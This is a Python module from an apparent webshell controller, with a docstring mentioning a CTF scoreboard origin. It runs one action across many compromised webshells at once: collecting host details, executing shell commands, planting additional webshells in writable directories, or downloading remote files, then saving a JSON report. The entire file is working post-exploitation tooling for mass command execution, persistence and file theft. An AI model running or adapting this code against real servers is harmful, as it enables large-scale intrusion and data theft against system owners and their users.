"""Non-interactive batch mode: run one action across many webshells.

Generalises the mass-operation pattern from the unmerged ``dev`` branch (which
hard-coded a specific CTF scoreboard API) into a scoreboard-agnostic runner that
loops a single action over every live shell and emits a structured JSON report —
without ever entering the REPL.
"""

from __future__ import annotations

import json
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any

from . import log
from .config import Config
from .core.webshell import WebShell
from .exceptions import WebshellError
from .features import files, inject, recon

ACTIONS = ("info", "exec", "inject", "download")


def _run_one(ws: WebShell, action: str, arg: str | None, config: Config) -> dict[str, Any]:
    log.info(f"[batch:{action}] {ws}")
    entry: dict[str, Any] = {"url": ws.url, "method": ws.method, "action": action, "ok": False}
    try:
        if action == "info":
            entry["data"] = {
                "webroot": ws.webroot,
                "php_version": ws.php_version,
                "kernel": ws.kernel_version,
            }
        elif action == "exec":
            entry["data"] = ws.run_command(arg or "id")
        elif action == "inject":
            dirs = recon.find_writable_dirs(ws)
            entry["data"] = inject.inject_webshell(ws, None, dirs, output_dir=config.output_dir)
        elif action == "download":
            if not arg:
                raise WebshellError("download requires --arg <remote-path>")
            files.download(ws, arg, config.output_dir)
            entry["data"] = "downloaded"
        else:  # pragma: no cover - guarded by argparse choices
            raise WebshellError(f"unknown batch action: {action}")
        entry["ok"] = True
    except WebshellError as exc:
        entry["reason"] = str(exc)
        log.error(f"failed: {exc}")
    return entry


def run_batch(
    webshells: list[WebShell], action: str, arg: str | None, config: Config
) -> list[dict[str, Any]]:
    """Run ``action`` against every shell, returning an order-preserving report.

    With ``config.workers > 1`` the shells are processed concurrently.
    """
    if config.workers > 1 and len(webshells) > 1:
        with ThreadPoolExecutor(max_workers=config.workers) as pool:
            return list(pool.map(lambda ws: _run_one(ws, action, arg, config), webshells))
    return [_run_one(ws, action, arg, config) for ws in webshells]


def write_report(report: list[dict[str, Any]], action: str, config: Config) -> Path:
    out = config.output_dir / f"batch_{action}_{int(time.time())}.json"
    out.write_text(json.dumps(report, indent=2))
    return out
